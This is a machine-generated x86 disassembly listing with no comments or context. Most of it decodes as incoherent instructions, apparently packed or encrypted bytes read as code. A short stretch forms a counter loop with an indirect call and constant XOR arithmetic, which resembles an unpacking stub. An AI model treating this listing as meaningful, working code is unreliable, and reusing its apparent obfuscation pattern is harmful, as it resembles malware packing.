  40f28e:	call   0xf6d4:0xc1d0
  40f294:	push   esi
  40f295:	mov    esi,0x5d8a49f2
  40f29a:	fucomip st,st(7)
  40f29c:	sar    BYTE PTR [ebp+0x788fc6ac],cl
  40f2a2:	mov    bl,0x67
  40f2a4:	ror    BYTE PTR [edi+0x35e481cc],1
  40f2aa:	jecxz  0x40f2b2
  40f2ac:	add    eax,0xc14d055d
  40f2b1:	retf   0x3cdf
  40f2b4:	cmp    al,0xd6
  40f2b6:	sub    eax,0x31bfd551
  40f2bb:	repnz ror eax,cl
  40f2be:	jmp    0x40f28e
  40f2c0:	icebp  
  40f2c1:	jl     0x40f2a2
  40f2c3:	test   eax,0x1f2ee5ba
  40f2c8:	div    BYTE PTR [ebx+0x20]
  40f2cb:	adc    DWORD PTR [eax+0x56dc3fc3],ecx
  40f2d1:	cmp    ecx,esi
  40f2d3:	xor    DWORD PTR [esi-0x16727509],0x842849b3
  40f2dd:	push   esp
  40f2de:	pop    ebp
  40f2df:	lea    esp,[esp+esi*8]
  40f2e2:	and    DWORD PTR [ebx-0x7c],0xbcfd4cf5
  40f2e9:	jg     0x40f321
  40f2eb:	out    dx,eax
  40f2ec:	shl    BYTE PTR [ecx],cl
  40f2ee:	jg     0x40f28b
  40f2f0:	out    0x9d,al
  40f2f2:	inc    esp
  40f2f3:	dec    esi
  40f2f4:	push   ecx
  40f2f5:	rcl    DWORD PTR [esi],1
  40f2f7:	mov    bh,0x92
  40f2f9:	or     al,0x6c
  40f2fb:	add    dh,BYTE PTR [ecx-0x61b3cc63]
  40f301:	in     al,0xdf
  40f303:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f304:	jecxz  0x40f2e9
  40f306:	jge    0x40f348
  40f308:	sub    edx,edx
  40f30a:	mov    ecx,0x35e00c69
  40f30f:	sbb    DWORD PTR [ecx],ebp
  40f311:	ror    BYTE PTR [esi-0x1c],1
  40f314:	dec    ebp
  40f315:	jmp    0x40f35a
  40f317:	scas   al,BYTE PTR es:[edi]
  40f318:	sar    ecx,1
  40f31a:	mov    al,ds:0x91db31ae
  40f31f:	dec    esp
  40f320:	and    BYTE PTR [eax+0x72],ah
  40f323:	adc    bh,bh
  40f325:	ss cmp bl,ch
  40f328:	call   0x890a:0x8027c97f
  40f32f:	cld    
  40f330:	leave  
  40f331:	inc    edx
  40f332:	(bad)  
  40f333:	xlat   BYTE PTR ds:[ebx]
  40f334:	mov    ebp,0x241f7e2b
  40f339:	xchg   DWORD PTR [ecx],ebp
  40f33b:	fst    QWORD PTR [esi-0x7a]
  40f33e:	cmp    bh,dl
  40f340:	mov    BYTE PTR ds:0xa8fc091d,bl
  40f346:	fcmovnb st,st(1)
  40f348:	jl     0x40f396
  40f34a:	mov    al,ds:0x82810358
  40f34f:	jo     0x40f3a5
  40f351:	loope  0x40f32d
  40f353:	lds    eax,FWORD PTR [ebp+0x3f78cf4e]
  40f359:	in     al,dx
  40f35a:	(bad)  
  40f35b:	(bad)  
  40f35c:	xlat   BYTE PTR ds:[ebx]
  40f35d:	xchg   edx,eax
  40f35e:	(bad)  
  40f35f:	mov    edx,0xd2e2aa10
  40f364:	push   edi
  40f365:	pusha  
  40f366:	add    DWORD PTR [esp+ecx*8],esi
  40f369:	int3   
  40f36a:	push   cs
  40f36b:	es push ebx
  40f36d:	(bad)  
  40f36e:	xor    ebp,DWORD PTR ss:[ecx]
  40f371:	jmp    0x40f355
  40f373:	enter  0x9c8d,0xbe
  40f377:	mov    edi,0xf958d9e2
  40f37c:	(bad)  
  40f37d:	mov    ch,0xb1
  40f37f:	dec    edx
  40f380:	in     eax,0xe4
  40f382:	bound  ecx,QWORD PTR [ebx]
  40f384:	mov    edx,0x277ba710
  40f389:	and    eax,0x2576393a
  40f38e:	(bad)  
  40f38f:	pop    ecx
  40f390:	out    0xe,eax
  40f392:	and    ebx,edx
  40f394:	pop    ss
  40f395:	test   BYTE PTR [edx+0x5537756b],0x3
  40f39c:	xchg   esp,eax
  40f39d:	adc    BYTE PTR [edx+0xc],0x93
  40f3a1:	es pop esp
  40f3a3:	ror    DWORD PTR [ebx],cl
  40f3a5:	fisub  DWORD PTR [edi+0x78]
  40f3a8:	jns    0x40f424
  40f3aa:	jle    0x40f408
  40f3ac:	add    BYTE PTR ds:[edi+0x6efab805],dh
  40f3b3:	repnz sub esi,DWORD PTR [ecx+0xf]
  40f3b7:	std    
  40f3b8:	cwde   
  40f3b9:	daa    
  40f3ba:	loopne 0x40f383
  40f3bc:	lods   al,BYTE PTR ds:[esi]
  40f3bd:	dec    eax
  40f3be:	dec    esp
  40f3bf:	xlat   BYTE PTR ds:[ebx]
  40f3c0:	sbb    BYTE PTR [esi+edi*8],0xc0
  40f3c4:	sbb    eax,0x883271e1
  40f3c9:	push   ebx
  40f3ca:	jb     0x40f38c
  40f3cc:	xchg   BYTE PTR [eax],bh
  40f3ce:	xchg   DWORD PTR [edx+0xb],esp
  40f3d1:	(bad)  
  40f3d2:	popf   
  40f3d3:	and    eax,0x81653d67
  40f3d8:	mov    edx,0xdf3145fe
  40f3dd:	pop    ebp
  40f3de:	xor    ebp,DWORD PTR [eax]
  40f3e0:	lods   al,BYTE PTR ds:[esi]
  40f3e1:	xor    BYTE PTR [edx-0x30058b0c],bh
  40f3e7:	cli    
  40f3e8:	les    ecx,FWORD PTR [ebp-0x35]
  40f3eb:	or     al,0x27
  40f3ed:	sbb    eax,0x9b8dde24
  40f3f2:	sahf   
  40f3f3:	adc    dl,BYTE PTR [ecx-0x31]
  40f3f6:	xchg   ebx,eax
  40f3f7:	shl    BYTE PTR [ecx+ecx*8-0x17f7397a],0x15
  40f3ff:	jb     0x40f45c
  40f401:	adc    al,0xc0
  40f403:	imul   BYTE PTR cs:[ecx]
  40f406:	or     esp,esi
  40f408:	dec    ebp
  40f409:	cmp    ecx,DWORD PTR fs:[eax+0x5f]
  40f40d:	(bad)  
  40f40e:	rcl    DWORD PTR [ebx],cl
  40f410:	jnp    0x40f474
  40f412:	rol    bh,cl
  40f414:	mov    ds:0xa1908cb2,al
  40f419:	push   ecx
  40f41a:	or     DWORD PTR [edx+eiz*1-0x32680b07],esp
  40f421:	imul   DWORD PTR [eax+edx*2-0x38]
  40f425:	and    al,0x93
  40f427:	test   al,0x6d
  40f429:	mov    DWORD PTR [ebp+0x1f56a658],esi
  40f42f:	(bad)  [ecx+0x3]
  40f432:	or     eax,0x79d17140
  40f437:	loope  0x40f3d4
  40f439:	pusha  
  40f43a:	scas   al,BYTE PTR es:[edi]
  40f43b:	mov    dh,0x70
  40f43d:	xor    esp,DWORD PTR [ecx+0x63]
  40f440:	mov    esp,0x81dfee15
  40f445:	xchg   esi,eax
  40f446:	(bad)  
  40f447:	mov    DWORD PTR [edx-0xd1029b],ebx
  40f44d:	out    0xcd,al
  40f44f:	mov    ?,WORD PTR [edi]
  40f451:	add    DWORD PTR [edx],edx
  40f453:	xchg   BYTE PTR [ebx+edi*4],ch
  40f456:	repnz dec edi
  40f458:	loope  0x40f47b
  40f45a:	out    dx,eax
  40f45b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f45c:	and    DWORD PTR [edi-0x7a],0xffffff81
  40f460:	(bad)
  40f465:	fwait
  40f466:	push   es
  40f467:	loopne 0x40f453
  40f469:	arpl   WORD PTR [ecx-0x44],di
  40f46c:	cmp    DWORD PTR [ecx+edi*2+0x194cd798],eax
  40f473:	(bad)  
  40f474:	cmp    BYTE PTR [eax+0x2a],ah
  40f477:	xor    al,0x89
  40f479:	aam    0x6
  40f47b:	out    0x31,al
  40f47d:	mov    ecx,0x6b2693c9
  40f482:	test   BYTE PTR [edx-0x2e],0x9d
  40f486:	mov    ebp,0xb5c44c44
  40f48b:	ja     0x40f4fb
  40f48d:	push   es
  40f48e:	lock cmc 
  40f490:	cmp    BYTE PTR [edx+ebp*2+0x5e068ecf],bl
  40f497:	dec    ebx
  40f498:	js     0x40f424
  40f49a:	arpl   WORD PTR [ecx],sp
  40f49c:	test   al,0x1
  40f49e:	aam    0x5f
  40f4a0:	imul   esi,ebx,0xaf95fb88
  40f4a6:	mul    DWORD PTR [edi]
  40f4a8:	loopne 0x40f527
  40f4aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4ab:	lods   eax,DWORD PTR ds:[esi]
  40f4ac:	xlat   BYTE PTR ds:[ebx]
  40f4ad:	mov    ebp,0x4b9dcaf5
  40f4b2:	and    BYTE PTR [ebp-0x30],dl
  40f4b5:	ret    0x5aa8
  40f4b8:	cmp    eax,0x9d9e4ac4
  40f4bd:	cmp    DWORD PTR [eax+0x79],ecx
  40f4c0:	dec    edx
  40f4c1:	pop    ecx
  40f4c2:	xchg   ecx,eax
  40f4c3:	inc    edx
  40f4c4:	jnp    0x40f458
  40f4c6:	(bad)  
  40f4c7:	cld    
  40f4c8:	adc    BYTE PTR [esi-0x4e4f0d67],bh
  40f4ce:	ret    
  40f4cf:	lods   al,BYTE PTR ds:[esi]
  40f4d0:	inc    edi
  40f4d1:	jp     0x40f4bb
  40f4d3:	mov    ecx,0x644c8233
  40f4d8:	ret    
  40f4d9:	ins    DWORD PTR es:[edi],dx
  40f4da:	out    0xe4,al
  40f4dc:	scas   al,BYTE PTR es:[edi]
  40f4dd:	mov    edi,edi
  40f4df:	in     eax,0x74
  40f4e1:	sub    DWORD PTR [ebp-0x198a20fb],esi
  40f4e7:	mov    WORD PTR [ebx-0x26cd3678],gs
  40f4ed:	adc    BYTE PTR [ebp+ebx*4+0x73f11317],dl
  40f4f4:	mov    eax,DWORD PTR [esp+eiz*2-0x7ffd498b]
  40f4fb:	xor    DWORD PTR [ecx-0x32],esp
  40f4fe:	aas    
  40f4ff:	call   0xd131:0xce66b6e7
  40f506:	lock mov dh,0x29
  40f509:	cld    
  40f50a:	push   edi
  40f50b:	fsubr  DWORD PTR [ecx-0x6c]
  40f50e:	fs scas al,BYTE PTR es:[edi]
  40f510:	push   es
  40f511:	xchg   esi,eax
  40f512:	jle    0x40f563
  40f514:	je     0x40f49d
  40f516:	imul   esi,esp,0xffffffb1
  40f519:	inc    edx
  40f51a:	add    BYTE PTR [ecx+esi*1],ch
  40f51d:	mov    bl,0x5
  40f51f:	stos   BYTE PTR es:[edi],al
  40f520:	retf   0xdb88
  40f523:	pop    ecx
  40f524:	jne    0x40f4b9
  40f526:	pop    ss
  40f527:	ret    
  40f528:	sub    eax,0xd748d932
  40f52d:	jne    0x40f4bc
  40f52f:	mov    bh,0xe8
  40f531:	loope  0x40f537
  40f533:	jg     0x40f51e
  40f535:	mov    DWORD PTR [ebp+0x54],ebx
  40f538:	pop    ds
  40f539:	enter  0x9ef0,0x38
  40f53d:	stc    
  40f53e:	xchg   esp,eax
  40f53f:	and    eax,DWORD PTR [eax-0x49c949c0]
  40f545:	pop    eax
  40f546:	inc    ecx
  40f547:	hlt    
  40f548:	jg     0x40f535
  40f54a:	adc    BYTE PTR [ecx+edx*8],0xa0
  40f54e:	pop    edx
  40f54f:	jns    0x82a9220d
  40f555:	pop    ebp
  40f556:	mov    eax,ds:0xd1ffc975
  40f55b:	pop    edx
  40f55c:	fist   WORD PTR [eax+0x57ca442b]
  40f562:	arpl   WORD PTR [edx],bp
  40f564:	or     bl,BYTE PTR ds:[ebx]
  40f567:	call   0x2a2e:0x631a9523
  40f56e:	mov    cl,ch
  40f570:	push   ecx
  40f571:	dec    bl
  40f573:	mov    cl,0x86
  40f575:	cmovg  esp,DWORD PTR [edx-0x5aa1e058]
  40f57c:	sbb    al,0x47
  40f57e:	arpl   WORD PTR ds:0x7aa3fe1e,cx
  40f584:	jl     0x40f512
  40f586:	mov    esi,0x111ea683
  40f58b:	(bad)  
  40f58c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f58d:	and    eax,0x46d20ab8
  40f592:	test   al,0x8
  40f594:	mov    bl,0xa
  40f596:	(bad)  
  40f597:	clc    
  40f598:	or     esi,DWORD PTR [esi-0x80]
  40f59b:	xchg   ebx,eax
  40f59c:	add    esi,DWORD PTR [esi]
  40f59e:	jb     0x40f5ed
  40f5a0:	fcmovnb st,st(6)
  40f5a2:	test   DWORD PTR [edi+0x7f],ebx
  40f5a5:	pop    esi
  40f5a6:	adc    al,BYTE PTR [eax]
  40f5a8:	(bad)  
  40f5a9:	sti    
  40f5aa:	aam    0xbc
  40f5ac:	xchg   ah,cl
  40f5ae:	into   
  40f5af:	ss in  eax,dx
  40f5b1:	enter  0x1e42,0xa9
  40f5b5:	shr    BYTE PTR [edx+esi*4],1
  40f5b8:	aam    0x29
  40f5ba:	imul   DWORD PTR [ebp+0x3a]
  40f5bd:	scas   al,BYTE PTR es:[edi]
  40f5be:	icebp  
  40f5bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5c0:	mov    ebp,0xc607a9e2
  40f5c5:	or     esi,edi
  40f5c7:	pop    ds
  40f5c8:	lds    eax,FWORD PTR [ebx-0x18]
  40f5cb:	imul   eax,DWORD PTR [ecx-0x15],0xd
  40f5cf:	sbb    eax,0x1da10de8
  40f5d4:	aaa    
  40f5d5:	call   0x3eb0:0x14873638
  40f5dc:	cmp    esi,esp
  40f5de:	mov    bl,0x2c
  40f5e0:	xchg   edi,eax
  40f5e1:	mov    dl,0xe0
  40f5e3:	pop    ds
  40f5e4:	or     bl,ch
  40f5e6:	adc    eax,0x3209a6b9
  40f5eb:	xor    al,0xe4
  40f5ed:	dec    esi
  40f5ee:	mov    BYTE PTR [esi+0x2f],dl
  40f5f1:	js     0x40f620
  40f5f3:	mov    ecx,0x68653e41
  40f5f8:	out    0xaf,eax
  40f5fa:	not    DWORD PTR [ecx+0x62531253]
  40f600:	xor    al,0xb1
  40f602:	push   esp
  40f603:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f604:	mov    bl,bl
  40f606:	icebp  
  40f607:	cld    
  40f608:	inc    ebp
  40f609:	xor    ecx,DWORD PTR [ebx]
  40f60b:	inc    ebx
  40f60c:	xchg   DWORD PTR [edi-0x44b96061],ecx
  40f612:	xor    BYTE PTR [esi-0x70],al
  40f615:	(bad)  
  40f616:	mov    gs,WORD PTR [edi-0x77]
  40f619:	jg     0x40f636
  40f61b:	fisub  DWORD PTR [edx-0x33]
  40f61e:	add    edi,ebp
  40f620:	sub    eax,0xfe7e6f7d
  40f625:	push   es
  40f626:	outs   dx,BYTE PTR es:[esi]
  40f628:	mov    al,0x1c
  40f62a:	sub    edx,DWORD PTR ds:0x591b1d02
  40f630:	sub    eax,ebp
  40f632:	lock or bh,BYTE PTR [eax+0x78192233]
  40f639:	cli    
  40f63a:	xchg   ecx,eax
  40f63b:	and    al,0x7
  40f63d:	pop    ebp
  40f63e:	xor    DWORD PTR [edi-0x617e14dc],0xf8b47e4c
  40f648:	push   esi
  40f649:	outs   dx,BYTE PTR ds:[esi]
  40f64a:	xor    eax,0x520cf37e
  40f64f:	or     ch,dh
  40f651:	push   eax
  40f652:	add    DWORD PTR [eax-0x2228ec54],ebx
  40f658:	scas   al,BYTE PTR es:[edi]
  40f659:	jecxz  0x40f5e8
  40f65b:	inc    ecx
  40f65c:	inc    ecx
  40f65d:	pop    edx
  40f65e:	and    al,0x28
  40f660:	repnz inc ebx
  40f662:	xchg   ebp,eax
  40f663:	sbb    ebx,edx
  40f665:	xchg   edi,eax
  40f666:	sbb    DWORD PTR [ebp+0x36],esi
  40f669:	and    BYTE PTR [ecx-0xca1ec2f],0x4
  40f670:	xchg   edx,eax
  40f671:	cmp    edx,DWORD PTR [edx+0x6d67c69a]
  40f677:	cmp    edi,DWORD PTR [ecx-0x29c65c59]
  40f67d:	int    0xdc
  40f67f:	psubb  mm3,QWORD PTR [ebx+0x17]
  40f683:	ja     0x40f6aa
  40f685:	xor    BYTE PTR [eax+0x3],dh
  40f688:	jns    0x40f625
  40f68a:	mov    eax,ds:0x96f5b337
  40f68f:	sbb    dl,BYTE PTR [ebp-0x2b64af66]
  40f695:	test   BYTE PTR [ecx+eax*1+0x4dd0d1e0],al
  40f69c:	add    al,0x7a
  40f69e:	xor    bl,BYTE PTR [ecx-0x48]
  40f6a1:	add    al,0xb5
  40f6a3:	je     0x40f660
  40f6a5:	test   BYTE PTR [ecx+0x3876c814],0x45
  40f6ac:	call   0x8bb3:0xb5521252
  40f6b3:	dec    eax
  40f6b4:	xchg   BYTE PTR ds:0x6e0a1246,al
  40f6ba:	or     ch,bl
  40f6bc:	(bad)  
  40f6bd:	ret    
  40f6be:	inc    ebp
  40f6bf:	ins    BYTE PTR es:[edi],dx
  40f6c0:	dec    esi
  40f6c1:	inc    ebp
  40f6c2:	or     bl,dl
  40f6c4:	pop    ebx
  40f6c5:	cmp    al,0x40
  40f6c7:	cmp    dh,BYTE PTR [edi]
  40f6c9:	repz hlt 
  40f6cb:	xor    DWORD PTR [edi],0x9fad4be3
  40f6d1:	pop    edx
  40f6d2:	sti    
  40f6d3:	call   0x5d360a5
  40f6d8:	retf   0x7ca9
  40f6db:	test   al,0xed
  40f6dd:	in     al,dx
  40f6de:	or     al,0x86
  40f6e0:	inc    ecx
  40f6e1:	retf   0x60d3
  40f6e4:	sbb    BYTE PTR [ecx],dh
  40f6e6:	test   BYTE PTR [eax-0x5605e3a3],bh
  40f6ec:	ins    BYTE PTR es:[edi],dx
  40f6ed:	add    bh,BYTE PTR [eax]
  40f6ef:	push   ds
  40f6f0:	xor    BYTE PTR [edi],ah
  40f6f2:	mov    al,0x1c
  40f6f4:	or     ebx,ebp
  40f6f6:	dec    ebp
  40f6f8:	jge    0x40f6c8
  40f6fa:	pop    ds
  40f6fb:	lock cmp WORD PTR [edx-0x67],0x3
  40f701:	dec    esp
  40f702:	pop    esp
  40f703:	faddp  st(3),st
  40f705:	ror    DWORD PTR [edi+0x3d],cl
  40f708:	clc    
  40f709:	pop    esi
  40f70a:	test   al,0xa8
  40f70c:	and    eax,0x1c52608b
  40f711:	fdivp  st(2),st
  40f713:	inc    ebx
  40f714:	icebp  
  40f715:	cmp    eax,0x77d2de53
  40f71a:	nop
  40f71b:	ss repnz xor eax,0x43c895cb
  40f722:	xchg   ecx,eax
  40f723:	push   edi
  40f724:	leave  
  40f725:	mov    ds:0x7e421c56,al
  40f72a:	or     al,0x5
  40f72c:	adc    eax,0x5f65c2
  40f731:	jl     0x40f6be
  40f733:	ds nop
  40f735:	dec    eax
  40f736:	mov    ebp,0x781f71f5
  40f73b:	test   DWORD PTR [ecx-0x52],edi
  40f73e:	xchg   esp,eax
  40f73f:	jle    0x40f6d6
  40f741:	pop    es
  40f742:	adc    esi,DWORD PTR [esi-0x4c]
  40f745:	pop    esi
  40f746:	mov    dl,0x19
  40f748:	sub    ebp,DWORD PTR [ecx*8+0x71f80097]
  40f74f:	sar    DWORD PTR [ebp-0x621b74a4],0xe3
  40f756:	jne    0x40f7c5
  40f758:	push   es
  40f759:	adc    DWORD PTR ds:0x5cb73055,ebp
  40f75f:	inc    BYTE PTR [ebx]
  40f761:	lea    esp,[edi+0x5253c729]
  40f767:	test   al,0xb4
  40f769:	or     edx,DWORD PTR [esp+esi*4-0x9a0f579]
  40f770:	push   ecx
  40f771:	test   eax,0x4bf89c9d
  40f776:	sbb    BYTE PTR [ebx],0x1f
  40f779:	pop    edx
  40f77a:	dec    ebx
  40f77b:	fsub   DWORD PTR ds:0x48ac6562
  40f781:	and    DWORD PTR [edi+eiz*4],0x2a
  40f785:	loop   0x40f718
  40f787:	out    dx,al
  40f788:	mov    DWORD PTR [edx],esi
  40f78a:	clc    
  40f78b:	mov    al,ds:0xc4a7adba
  40f790:	push   edx
  40f791:	in     eax,dx
  40f792:	mov    DWORD PTR [esi-0x33],eax
  40f795:	fisub  WORD PTR [ebx-0x44]
  40f798:	enter  0x19a9,0x32
  40f79c:	rol    DWORD PTR [ecx],0x95
  40f79f:	outs   dx,DWORD PTR ds:[esi]
  40f7a0:	lock mov BYTE PTR cs:[edx+0x87b86dc],bl
  40f7a8:	in     al,dx
  40f7a9:	pop    edi
  40f7aa:	sub    DWORD PTR [ecx-0x5881f970],ebx
  40f7b0:	das    
  40f7b1:	in     al,0xed
  40f7b3:	push   ds
  40f7b4:	jmp    0x40f791
  40f7b6:	ss cmp eax,0x7109e688
  40f7bc:	test   dh,dh
  40f7be:	enter  0x738e,0x15
  40f7c2:	mov    BYTE PTR [eax+ebx*1+0x8b3b964],cl
  40f7c9:	push   ecx
  40f7ca:	pop    es
  40f7cb:	xor    eax,ecx
  40f7cd:	or     DWORD PTR ds:0x426ed1,0x426eb9
  40f7d7:	add    eax,0x3272fa
  40f7dc:	mov    DWORD PTR [edx],eax
  40f7de:	and    DWORD PTR ds:0x426ed5,0x0
  40f7e8:	jmp    0x40f7fb
  40f7ed:	xor    eax,eax
  40f7ef:	or     eax,DWORD PTR ds:0x426ed5
  40f7f5:	inc    eax
  40f7f6:	mov    ds:0x426ed5,eax
  40f7fb:	cmp    DWORD PTR ds:0x426ed5,0x14
  40f802:	jae    0x40f83d
  40f808:	cmp    DWORD PTR ds:0x426ed5,0x5
  40f80f:	jb     0x40f83d
  40f815:	jmp    0x40f820
  40f81a:	call   DWORD PTR ds:0x42fa38
  40f820:	cmp    DWORD PTR ds:0x426ed5,0x4
  40f827:	jne    0x40f838
  40f82d:	mov    eax,ds:0x426ed5
  40f832:	inc    eax
  40f833:	mov    ds:0x426ed5,eax
  40f838:	jmp    0x40f7ed
  40f83d:	mov    eax,DWORD PTR [ebp+0xc]
  40f840:	xor    eax,ecx
  40f842:	push   esi
  40f843:	mov    esi,DWORD PTR [ebp+0x10]
  40f846:	mov    edx,0x3272fa
  40f84b:	add    eax,edx
  40f84d:	mov    DWORD PTR [esi+0x4],eax
  40f850:	mov    eax,DWORD PTR [ebp+0x14]
  40f853:	jmp    0x411bef
  40f858:	or     ecx,DWORD PTR [ecx+0x2a]
  40f85b:	mov    ds:0x7813f878,al
  40f860:	xor    al,0xd8
  40f862:	mov    edi,DWORD PTR ds:0x5b0a4c0e
  40f868:	fwait
  40f869:	dec    esi
  40f86a:	jnp    0x40f8e7
  40f86c:	clc    
  40f86d:	pushf  
  40f86e:	jnp    0x40f8eb
  40f870:	and    DWORD PTR ds:[eax-0x77],ecx
  40f874:	sahf   
  40f875:	mul    dl
  40f877:	repz fld TBYTE PTR [ebx+ebp*4]
  40f87b:	je     0x40f8a1
  40f87d:	inc    edx
  40f87e:	mov    esi,0x7b69dedc
  40f883:	mov    esi,0x6831c4b9
  40f888:	mov    dh,ah
  40f88a:	and    DWORD PTR [eax+0x3e],esp
  40f88d:	jns    0x40f860
  40f88f:	mov    al,ds:0x3480a5be
  40f894:	mov    eax,ds:0x1af34678
  40f899:	jno    0x40f833
  40f89b:	push   edx
  40f89c:	sub    eax,0xdfa2c5ff
  40f8a1:	xlat   BYTE PTR ds:[ebx]
  40f8a2:	and    eax,0xf552a6f2
  40f8a7:	in     al,dx
  40f8a8:	or     eax,0x4bc90b0e
  40f8ad:	aaa    
  40f8ae:	fxch   st(1)
  40f8b0:	xchg   esi,eax
  40f8b1:	in     al,dx
  40f8b2:	pop    es
  40f8b3:	xchg   esp,eax
  40f8b4:	jecxz  0x40f8cc
  40f8b6:	push   edx
  40f8b7:	push   esi
  40f8b8:	xchg   edi,eax
  40f8b9:	cmp    DWORD PTR [eax],edx
  40f8bb:	inc    edx
  40f8bc:	cmc    
  40f8bd:	push   edx
  40f8be:	jns    0x40f914
  40f8c0:	fild   WORD PTR [ebx+0x744950eb]
  40f8c6:	inc    edi
  40f8c7:	(bad)
  40f8ca:	scas   al,BYTE PTR es:[edi]
  40f8cb:	push   ebp
  40f8cc:	xchg   edx,eax
  40f8cd:	mov    dh,0x6b
  40f8cf:	jnp    0x40f8da
  40f8d1:	push   edx
  40f8d2:	push   ebx
  40f8d3:	dec    eax
  40f8d4:	mov    ecx,0x4d15adde
  40f8d9:	or     al,0xf2
  40f8db:	mov    ecx,0xef18aa4f
  40f8e0:	cli    
  40f8e1:	imul   eax,ebx,0xe9a6e30e
  40f8e7:	cmp    ebx,DWORD PTR [eax+edi*4]
  40f8ea:	out    dx,al
  40f8eb:	mov    bh,bh
  40f8ed:	int3   
  40f8ee:	and    eax,0x87627815
  40f8f3:	pop    eax
  40f8f4:	fimul  DWORD PTR [ebx+0x45]
  40f8f7:	neg    BYTE PTR [edx+eax*2]
  40f8fa:	enter  0x16df,0x9a
  40f8fe:	jno    0x40f8f9
  40f900:	cli    
  40f901:	xchg   ecx,ebx
  40f903:	leave  
  40f904:	sub    al,0xe6
  40f906:	fwait
  40f907:	out    dx,eax
  40f908:	ins    DWORD PTR es:[edi],dx
  40f909:	mov    esp,0x8af35601
  40f90e:	xor    al,BYTE PTR [edx+0x1f]
  40f911:	jae    0x40f942
  40f913:	xor    eax,0x6cc3e2c5
  40f918:	clc    
  40f919:	xchg   edi,eax
  40f91a:	xchg   edx,eax
  40f91b:	cmp    DWORD PTR [ecx-0x4f86585e],edx
  40f921:	mov    al,0x45
  40f923:	mov    esi,0x9c583222
  40f928:	dec    eax
  40f929:	not    DWORD PTR [edx-0x60e05012]
  40f92f:	add    DWORD PTR [edi],0x11
  40f932:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40f934:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f935:	leave  
  40f936:	add    dh,al
  40f938:	ret    0x1b23
  40f93b:	mov    edi,0x9d045d2a
  40f940:	jmp    0x22b7:0x38b5e4b
  40f947:	frstor [ebx]
  40f949:	enter  0xe8dc,0x5e
  40f94d:	dec    esp
  40f94e:	ss jp  0x40f9ac
  40f951:	ss and eax,0xda24f06e
  40f957:	(bad)  
  40f958:	ins    DWORD PTR es:[edi],dx
  40f959:	in     al,dx
  40f95a:	aam    0x35
  40f95c:	push   0x9375ab50
  40f961:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f962:	dec    ebx
  40f963:	out    dx,al
  40f964:	mov    edx,0xfb02327a
  40f969:	ret    
  40f96a:	andnps xmm6,xmm6
  40f96d:	(bad)  
  40f96e:	retf   
  40f96f:	das    
  40f970:	add    dh,bh
  40f972:	fwait
  40f973:	pusha  
  40f974:	pop    ds
  40f975:	dec    esp
  40f976:	cld    
  40f977:	fdivr  QWORD PTR [ebp+esi*4+0x59c7ce0a]
  40f97e:	pop    gs
  40f980:	sbb    BYTE PTR ds:0x6284e10d,dh
  40f986:	dec    ebx
  40f987:	scas   al,BYTE PTR es:[edi]
  40f988:	test   al,0x6c
  40f98a:	bound  ecx,QWORD PTR [ebx+ecx*2-0x60]
  40f98e:	test   al,0x83
  40f990:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f991:	iret   
  40f992:	adc    DWORD PTR [ebx+0x472b734d],0xb5df5d74
  40f99c:	mov    cl,0x32
  40f99e:	mov    ds:0x5af5fb8b,al
  40f9a3:	pusha  
  40f9a4:	in     eax,0x69
  40f9a6:	and    BYTE PTR [ebx+esi*2],ah
  40f9a9:	cmp    DWORD PTR [eax+0x7e],0xffffffa5
  40f9ad:	xchg   esi,eax
  40f9ae:	std    
  40f9af:	sub    edx,DWORD PTR [ebx-0x53bb091f]
  40f9b5:	mov    DWORD PTR [ebx],esi
  40f9b7:	add    cl,BYTE PTR [esi+0x66]
  40f9ba:	in     al,dx
  40f9bb:	into   
  40f9bc:	push   edi
  40f9bd:	or     eax,0x880102a
  40f9c2:	xchg   ecx,eax
  40f9c3:	inc    esp
  40f9c4:	(bad)  
  40f9c5:	sti    
  40f9c6:	jns    0x40fa07
  40f9c8:	xor    DWORD PTR [eax-0x24e8b89b],esp
  40f9ce:	mov    dl,0xc6
  40f9d0:	in     eax,dx
  40f9d1:	leave  
  40f9d2:	jecxz  0x40f994
  40f9d4:	add    bl,BYTE PTR [ebx-0x11156b1b]
  40f9da:	into   
  40f9db:	jbe    0x40f9ed
  40f9dd:	ins    BYTE PTR es:[edi],dx
  40f9de:	(bad)  
  40f9df:	es and al,0xff
  40f9e2:	add    eax,0x76bde99d
  40f9e7:	pop    ds
  40f9e8:	and    eax,0x9365e869
  40f9ed:	lods   eax,DWORD PTR ds:[esi]
  40f9ee:	push   edi
  40f9ef:	rol    BYTE PTR [ebp-0xd],cl
  40f9f2:	fs mov dl,al
  40f9f5:	jae    0x40f987
  40f9f7:	xor    al,0x88
  40f9f9:	sbb    eax,0x904e1f50
  40f9fe:	cld    
  40f9ff:	xchg   esi,eax
  40fa00:	or     ch,bl
  40fa02:	test   dh,dl
  40fa04:	js     0x40fa64
  40fa06:	jo     0x40f9fe
  40fa08:	icebp  
  40fa09:	ds mov eax,0x15fa3dc1
  40fa0f:	ss push esi
  40fa11:	xchg   esp,eax
  40fa12:	pop    edi
  40fa13:	fwait
  40fa14:	outs   dx,BYTE PTR ds:[esi]
  40fa15:	test   eax,0x14fb6eba
  40fa1a:	pop    es
  40fa1b:	jnp    0x40fa04
  40fa1d:	les    ecx,FWORD PTR [esi]
  40fa1f:	dec    ecx
  40fa20:	sahf   
  40fa21:	cmp    eax,0xabd788df
  40fa26:	cdq    
  40fa27:	push   esi
  40fa28:	icebp  
  40fa29:	repz or BYTE PTR [ebp-0x31],0x54
  40fa2e:	scas   al,BYTE PTR es:[edi]
  40fa2f:	inc    edi
  40fa30:	pop    ebx
  40fa31:	fisub  DWORD PTR [edx-0x77]
  40fa34:	inc    DWORD PTR [ebx-0x5c]
  40fa37:	add    BYTE PTR [edx+0xa],dl
  40fa3a:	adc    ch,0xf0
  40fa3d:	dec    edx
  40fa3f:	jge    0x40fa33
  40fa41:	aam    0x77
  40fa43:	fldenv [ebx-0x2c]
  40fa46:	sub    DWORD PTR [esi+0x55],esi
  40fa49:	cmp    al,0xa
